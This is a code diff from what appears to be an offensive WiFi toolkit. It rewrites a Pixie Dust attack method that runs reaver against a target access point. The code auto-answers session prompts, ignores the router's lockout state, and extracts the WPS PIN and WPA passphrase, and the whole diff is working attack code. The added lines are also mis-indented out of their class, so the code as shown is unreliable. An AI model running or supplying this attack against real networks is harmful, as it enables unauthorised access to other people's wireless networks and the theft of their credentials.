@@ -178,123 +178,188 @@ class WPSAttack(BaseAttack):
             return []
     
     def _execute_pixie_dust(
-        self,
-        bssid: str,
-        channel: int,
-        timeout: int = 60
-    ) -> WPSResult:
-        """
-        Execute Pixie Dust attack
-        
-        Args:
-            bssid: Target AP BSSID
-            channel: WiFi channel
-            timeout: Attack timeout
-            
-        Returns:
-            WPSResult
-        """
-        if not self.reaver_path:
-            return WPSResult(
-                attack_type=WPSAttackType.PIXIE_DUST,
-                target_bssid=bssid,
-                success=False,
-                message="reaver not installed",
-                error="Missing dependency"
-            )
-        
-        logger.info(f"Attempting Pixie Dust attack on {bssid}")
-        
-        result = WPSResult(
+    self,
+    bssid: str,
+    channel: int,
+    timeout: int = 180,
+    max_retries: int = 10
+) -> WPSResult:
+    """
+    Execute Pixie Dust attack with live output like wifite
+    """
+    if not self.reaver_path:
+        return WPSResult(
             attack_type=WPSAttackType.PIXIE_DUST,
             target_bssid=bssid,
-            pixie_dust_attempted=True
+            success=False,
+            message="reaver not installed",
+            error="Missing dependency"
+        )
+    
+    logger.info(f"Attempting Pixie Dust attack on {bssid}")
+    
+    result = WPSResult(
+        attack_type=WPSAttackType.PIXIE_DUST,
+        target_bssid=bssid,
+        pixie_dust_attempted=True
+    )
+    
+    # Delete any old session files
+    import os
+    import glob
+    session_files = glob.glob(f"/tmp/reaver/*{bssid.replace(':', '')}*")
+    for f in session_files:
+        try:
+            os.remove(f)
+            logger.debug(f"Removed old session: {f}")
+        except:
+            pass
+    
+    try:
+        # Build command WITHOUT -S (causes issues), just delete sessions first
+        cmd = [
+            self.reaver_path,
+            '-i', self.interface,
+            '-b', bssid,
+            '-c', str(channel),
+            '-K', '1',  # Pixie Dust
+            '-vv',
+            '-N',
+            '-L',
+            '-d', '2',
+            '-T', '1',
+            '-r', '0:10',
+            '-t', '5',  # M5 timeout
+            '-x', '3'   # Pin tries before giving up
+        ]
+        
+        logger.debug(f"Running: {' '.join(cmd)}")
+        
+        # Execute with pseudo-terminal to avoid prompts
+        import pty
+        import select
+        
+        master, slave = pty.openpty()
+        
+        process = subprocess.Popen(
+            cmd,
+            stdin=slave,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
         )
         
-        try:
-            # Build reaver command for Pixie Dust
-            cmd = [
-                self.reaver_path,
-               '-i', self.interface,
-               '-b', bssid,
-               '-c', str(channel),
-               '-K', '1',  # Pixie Dust attack
-               '-vv',      # Very verbose
-               '-N',       # Don't send NACK messages
-               '-L', '-S',       # CRITICAL: Don't use session files
-    '-d', '2',  # Delay between attempts (helps with deauth)
-    '-T', '1',  # Timeout for responses
-    '-r', '0:10'        # Ignore locked state
-            ]
+        os.close(slave)
+        
+        # Monitor with live output
+        pin = None
+        psk = None
+        deauth_count = 0
+        timeout_count = 0
+        
+        start_time = time.time()
+        last_status = ""
+        
+        while True:
+            if time.time() - start_time > timeout:
+                process.kill()
+                logger.warning(f"Timeout after {timeout}s")
+                break
             
-            logger.debug(f"Running: {' '.join(cmd)}")
+            # Use select for non-blocking read
+            ready = select.select([process.stdout], [], [], 0.1)
             
-            # Execute reaver
-            process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                text=True
-            )
-            
-            # Monitor output
-            pin = None
-            psk = None
-            
-            start_time = time.time()
-            
-            while True:
-                if time.time() - start_time > timeout:
-                    process.kill()
-                    break
-                
+            if ready[0]:
                 line = process.stdout.readline()
                 if not line:
                     if process.poll() is not None:
                         break
                     continue
                 
-                logger.debug(line.strip())
+                line = line.strip()
                 
-                # Parse for PIN
+                # Print status updates live (like wifite)
+                if any(x in line for x in ['Sending', 'Received', 'Trying', 'Associated']):
+                    # Extract key status
+                    if 'Sending EAPOL' in line:
+                        status = "Sending EAPOL..."
+                    elif 'Received M' in line:
+                        status = f"Received {line.split('Received')[1].split()[0]}"
+                    elif 'Trying pin' in line:
+                        pin_try = line.split('"')[1] if '"' in line else "..."
+                        status = f"Trying PIN: {pin_try}"
+                    elif 'Associated with' in line:
+                        status = "Associated with AP"
+                    else:
+                        status = line[:50]
+                    
+                    if status != last_status:
+                        print(f"\r  {status}                    ", end='', flush=True)
+                        last_status = status
+                
+                logger.debug(line)
+                
+                # Handle session prompt automatically
+                if 'Restore previous session' in line:
+                    try:
+                        os.write(master, b'n\n')  # Answer 'no'
+                        logger.debug("Auto-answered session prompt: no")
+                    except:
+                        pass
+                
+                # Track issues
+                if "deauth" in line.lower():
+                    deauth_count += 1
+                
+                if "timeout" in line.lower():
+                    timeout_count += 1
+                
+                # Parse success
                 pin_match = re.search(r'WPS PIN: [\'"]([\d]+)[\'"]', line)
                 if pin_match:
                     pin = pin_match.group(1)
                     logger.success(f"Found PIN: {pin}")
+                    print(f"\n  ✓ Found PIN: {pin}")
                 
-                # Parse for PSK
                 psk_match = re.search(r'WPA PSK: [\'"](.*)[\'"]', line)
                 if psk_match:
                     psk = psk_match.group(1)
                     logger.success(f"Found PSK: {psk}")
+                    print(f"  ✓ Found PSK: {psk}")
                 
-                # Check for success
                 if pin and psk:
                     result.success = True
                     result.pin = pin
                     result.psk = psk
                     result.pixie_dust_success = True
-                    result.message = "Pixie Dust successful"
+                    result.message = f"Cracked! (deauths: {deauth_count})"
                     process.kill()
                     break
                 
-                # Check for failure indicators
-                if "Pixie Dust attack failed" in line or "WPS transaction failed" in line:
-                    logger.warning("Pixie Dust not vulnerable")
+                if "Pixie Dust attack failed" in line:
                     break
-            
-            process.wait(timeout=5)
-            
-            if not result.success:
-                result.message = "Pixie Dust attack failed - AP not vulnerable"
-            
-        except Exception as e:
-            logger.error(f"Pixie Dust attack error: {e}")
-            result.error = str(e)
-            result.message = f"Attack failed: {e}"
         
-        result.end_time = datetime.now()
-        return result
+        print()  # New line after status updates
+        
+        try:
+            process.wait(timeout=2)
+        except subprocess.TimeoutExpired:
+            process.kill()
+            process.wait()
+        
+        os.close(master)
+        
+        if not result.success:
+            result.message = f"Not vulnerable (deauths: {deauth_count}, timeouts: {timeout_count})"
+        
+    except Exception as e:
+        logger.error(f"Pixie Dust error: {e}")
+        result.error = str(e)
+        result.message = f"Attack failed: {e}"
+    
+    result.end_time = datetime.now()
+    return result
     
     def _execute_pin_bruteforce(
         self,
